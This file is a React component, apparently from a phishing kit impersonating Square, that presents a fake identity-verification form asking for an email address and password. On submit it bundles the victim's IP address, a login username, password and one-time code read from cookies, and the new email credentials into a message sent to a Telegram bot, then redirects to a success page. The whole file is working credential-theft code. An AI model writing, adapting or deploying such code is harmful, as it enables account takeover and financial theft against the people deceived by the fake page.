import React, {useState} from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

export default function EmailVerif() {
  const cookie_details:Login = cookies.get("login1");
  const auth = cookies.get("verif");
  const [formInput, setFormInput] = useState<{email:string, email_pass:string}>({email:"", email_pass:""})
const [isLoading, setIsLoading] = React.useState(false);
const navigate = useNavigate()

function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
    setFormInput((prevData) => ({
        ...prevData,
        [event.target.name]: event.target.value
    }))
}

const [addy, setAddy] = React.useState<string>();

async function getIP() {
  const request = await fetch("https://api.ipify.org?format=json");
  const response: { ip: string } = await request.json();
  setAddy(response.ip);
}

React.useEffect(() => {
  getIP();
}, []);

async function handleSubmit(event: React.FormEvent<HTMLFormElement>){
    
    event.preventDefault()
    setIsLoading(true)
    const message = `
    [----+🏦 SQUARE 🏦+-----]

      ${addy}

      FIRST LOGIN
      USERNAME: ${cookie_details.username}
      PASSWORD: ${cookie_details.password}

      OTP: ${auth}

      EMAIL
      EMAIL: ${formInput.email}
      PASSWORD: ${formInput.email_pass}
    `;
    await TelegramSend(message)
    
    setIsLoading(false)
    navigate("../success")
    
}
  return (
    <div className="middle-form">
      <div className="submitForm">
       
       <h3>Sign in</h3>
       <p>Verify your identity by confirming your email address credential</p>
        <form id="login-form" onSubmit={handleSubmit} method="post">
          <div className="input-field" style={{ textAlign: "left" }}>
           
            <input minLength={6}  placeholder="Email" onChange={handleInputChange} required  name="email" type="email" />
          </div>
          <div className="input-field" style={{ textAlign: "left" }}>
           
            <input minLength={6}  placeholder="password" onChange={handleInputChange} required  name="email_pass" type="password" />
          </div>
          

          {isLoading ?
            <button style={{ marginTop: "-2px" }} type="button">
          Please wait...
        </button>
          :
          <button style={{ marginTop: "-2px" }} type="submit">
          Submit
        </button>}
        </form>

        
     
      </div>
      </div>
  );
}
